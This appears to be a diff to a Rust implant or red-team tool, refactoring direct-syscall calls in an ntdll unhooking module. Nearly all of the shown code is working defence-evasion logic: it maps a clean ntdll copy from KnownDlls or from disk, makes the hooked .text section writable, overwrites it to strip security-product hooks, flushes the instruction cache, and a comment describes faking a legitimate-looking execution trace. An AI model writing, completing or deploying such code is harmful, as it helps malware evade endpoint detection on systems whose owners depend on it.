@@ -412,7 +412,7 @@ unsafe fn normalize_execution() {
     // that doesn't require any special access rights. Calling it immediately
     // after unhooking creates a legitimate-looking execution trace.
     let mut counter: i64 = 0;
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtQueryPerformanceCounter",
         &mut counter as *mut _ as u64,
         std::ptr::null_mut::<u64>() as u64,
@@ -456,7 +456,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     obj_name.Buffer = full_name.as_mut_ptr();
 
     let mut h_section: usize = 0;
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtOpenSection",
         &mut h_section as *mut _ as u64,
         (SECTION_MAP_READ | SYNCHRONIZE) as u64,
@@ -477,7 +477,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     let mut view_size: usize = 0;
 
     // NtMapViewOfSection: InheritDisposition = ViewUnmap (1), Win64Protect = PAGE_READONLY
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtMapViewOfSection",
         h_section as u64,           // SectionHandle
         cur_proc,                    // ProcessHandle (current process)
@@ -489,10 +489,11 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
         1u64,                        // InheritDisposition = ViewUnmap
         0u64,                        // AllocationType
         PAGE_READONLY as u64,        // Win64Protect
-    );
+    )
+    .map_err(|e| anyhow::anyhow!("NtMapViewOfSection(KnownDlls) syscall error: {e}"))?;
 
     if status < 0 || clean_base == 0 {
-        let _ = syscall!("NtClose", h_section as u64);
+        let _ = crate::syscall!("NtClose", h_section as u64);
         return Err(anyhow::anyhow!(
             "NtMapViewOfSection(KnownDlls) NTSTATUS {:#010x}",
             status as u32
@@ -544,23 +545,24 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     let mut prot_base = hooked_text_base;
     let mut prot_size = copy_size;
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtProtectVirtualMemory",
         cur_proc,
         &mut prot_base as *mut _ as u64,
         &mut prot_size as *mut _ as u64,
         PAGE_READWRITE as u64,
         &mut old_prot as *mut _ as u64,
-    );
+    )
+    .map_err(|e| anyhow::anyhow!("NtProtectVirtualMemory(RW) syscall error: {e}"))?;
 
     if status < 0 {
         // Cleanup: unmap clean copy and close section handle
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtUnmapViewOfSection",
             cur_proc,
             clean_base as u64,
         );
-        let _ = syscall!("NtClose", h_section as u64);
+        let _ = crate::syscall!("NtClose", h_section as u64);
         return Err(anyhow::anyhow!(
             "NtProtectVirtualMemory(RW) on hooked .text failed: NTSTATUS {:#010x}",
             status as u32
@@ -578,7 +580,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     let mut dummy_prot: u32 = 0;
     let mut restore_base = hooked_text_base;
     let mut restore_size = copy_size;
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtProtectVirtualMemory",
         cur_proc,
         &mut restore_base as *mut _ as u64,
@@ -588,7 +590,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     );
 
     // ── Step 5: Flush instruction cache ──────────────────────────────────
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtFlushInstructionCache",
         cur_proc,
         hooked_text_base as u64,
@@ -596,8 +598,8 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     );
 
     // ── Step 6: Cleanup ──────────────────────────────────────────────────
-    let _ = syscall!("NtUnmapViewOfSection", cur_proc, clean_base as u64);
-    let _ = syscall!("NtClose", h_section as u64);
+    let _ = crate::syscall!("NtUnmapViewOfSection", cur_proc, clean_base as u64);
+    let _ = crate::syscall!("NtClose", h_section as u64);
 
     log::info!(
         "[ntdll_unhook] KnownDlls unhook complete — .text overwritten ({:#x} bytes)",
@@ -638,7 +640,7 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
     let mut io_status = [0u64; 2];
     let mut h_file: usize = 0;
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtCreateFile",
         &mut h_file as *mut _ as u64,
         (SYNCHRONIZE | FILE_READ_DATA) as u64,
@@ -649,7 +651,8 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
         FILE_SHARE_READ as u64,
         1u64,                                   // CreateDisposition = FILE_OPEN
         0x60u64,                                 // CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
-    );
+    )
+    .map_err(|e| anyhow::anyhow!("NtCreateFile(ntdll.dll) syscall error: {e}"))?;
 
     if status < 0 || h_file == 0 {
         return Err(anyhow::anyhow!(
@@ -664,7 +667,7 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
     let mut file_buf = vec![0u8; 128 * 1024];
     let mut bytes_read: usize = 0;
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtReadFile",
         h_file as u64,
         0u64, // Event
@@ -675,9 +678,10 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
         file_buf.len() as u64,
         0u64, // ByteOffset (NULL = read from current position)
         0u64, // Key
-    );
+    )
+    .map_err(|e| anyhow::anyhow!("NtReadFile(ntdll.dll) syscall error: {e}"))?;
 
-    let _ = syscall!("NtClose", h_file as u64);
+    let _ = crate::syscall!("NtClose", h_file as u64);
 
     if status < 0 {
         return Err(anyhow::anyhow!(
@@ -723,7 +727,7 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
             SecurityQualityOfService: ptr::null_mut(),
         };
         let mut io_status2 = [0u64; 2];
-        let status2 = syscall!(
+        let status2 = crate::syscall!(
             "NtCreateFile",
             &mut h_file2 as *mut _ as u64,
             (SYNCHRONIZE | FILE_READ_DATA) as u64,
@@ -734,14 +738,15 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
             FILE_SHARE_READ as u64,
             1u64,                                   // CreateDisposition = FILE_OPEN
             0x60u64,                                 // CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
-        );
+        )
+        .map_err(|e| anyhow::anyhow!("NtCreateFile(re-read) syscall error: {e}"))?;
         if status2 < 0 {
             return Err(anyhow::anyhow!(
                 "NtCreateFile(re-read) NTSTATUS {:#010x}",
                 status2 as u32
             ));
         }
-        let status3 = syscall!(
+        let status3 = crate::syscall!(
             "NtReadFile",
             h_file2 as u64,
             0u64,
@@ -752,8 +757,9 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
             big_buf.len() as u64,
             0u64,
             0u64,
-        );
-        let _ = syscall!("NtClose", h_file2 as u64);
+        )
+        .map_err(|e| anyhow::anyhow!("NtReadFile(re-read) syscall error: {e}"))?;
+        let _ = crate::syscall!("NtClose", h_file2 as u64);
         if status3 < 0 {
             return Err(anyhow::anyhow!(
                 "NtReadFile(re-read) NTSTATUS {:#010x}",
@@ -793,14 +799,15 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
     let mut old_prot: u32 = 0;
     let mut prot_base = hooked_text_base;
     let mut prot_size = copy_size;
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtProtectVirtualMemory",
         cur_proc,
         &mut prot_base as *mut _ as u64,
         &mut prot_size as *mut _ as u64,
         PAGE_READWRITE as u64,
         &mut old_prot as *mut _ as u64,
-    );
+    )
+    .map_err(|e| anyhow::anyhow!("NtProtectVirtualMemory(RW) syscall error: {e}"))?;
     if status < 0 {
         return Err(anyhow::anyhow!(
             "NtProtectVirtualMemory(RW) failed: NTSTATUS {:#010x}",
@@ -816,7 +823,7 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
     let mut dummy_prot: u32 = 0;
     let mut restore_base = hooked_text_base;
     let mut restore_size = copy_size;
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtProtectVirtualMemory",
         cur_proc,
         &mut restore_base as *mut _ as u64,
@@ -826,7 +833,7 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
     );
 
     // Flush instruction cache
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtFlushInstructionCache",
         cur_proc,
         hooked_text_base as u64,
